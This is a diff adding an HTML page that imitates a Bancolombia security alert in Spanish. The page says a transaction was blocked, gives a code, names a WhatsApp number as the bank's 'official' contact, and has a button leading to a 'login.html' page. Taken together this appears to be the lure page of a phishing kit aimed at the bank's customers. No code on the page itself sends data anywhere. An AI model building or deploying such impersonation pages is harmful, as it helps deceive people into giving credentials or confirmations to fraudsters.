@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Alerta Bancolombia</title>
+
+<style>
+body{
+    margin:0;
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    background:#2c2c2c;
+    font-family: Arial, sans-serif;
+}
+
+/* CARD */
+.card{
+   width: 304px;
+    background: #fff;
+    border-radius: 20px;
+    padding: 62px 32px;
+    text-align: center;
+    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+}
+
+/* ICON */
+.icon{
+    width:60px;
+    height:60px;
+    background:#ffd600;
+    border-radius:50%;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    margin:0 auto 15px;
+    font-size:26px;
+}
+
+/* TITLE */
+.title{
+    font-size:18px;
+    font-weight:bold;
+    color:#333;
+    margin-bottom:10px;
+}
+
+/* TEXT */
+.text{
+    font-size:14px;
+    color:#555;
+    line-height:1.5;
+    margin-bottom:75px;
+}
+
+.code{
+    font-weight:bold;
+    margin:10px 0;
+    color:#333;
+}
+
+/* BUTTON */
+.btn{
+    width:100%;
+    padding:12px;
+    border:none;
+    border-radius:25px;
+    background:#ffd600;
+    font-weight:bold;
+    cursor:pointer;
+    font-size:14px;
+}
+
+.btn:hover{
+    background:#f5c400;
+}
+</style>
+
+</head>
+
+<body>
+
+<div class="card">
+    <div class="icon">✋</div>
+
+    <div class="title">
+        Por seguridad, no puedes continuar la transacción
+    </div>
+
+    <div class="text">
+        Código: 923 Para confirmar si eres tú quién hace la transacción, 
+        te escribiremos desde nuestro WhatsApp oficial 301 353 6788, 
+        responde Sí o No. Si tienes dudas, llámanos a la Sucursal Telefónica 
+        y elige la opción 3 y de nuevo 3.
+    </div>
+
+    <div class="code">Código 923</div>
+
+    <button class="btn" onclick="window.location.href='login.html'">
+        Intentar más tarde
+    </button>
+</div>
+
+</body>
+</html>
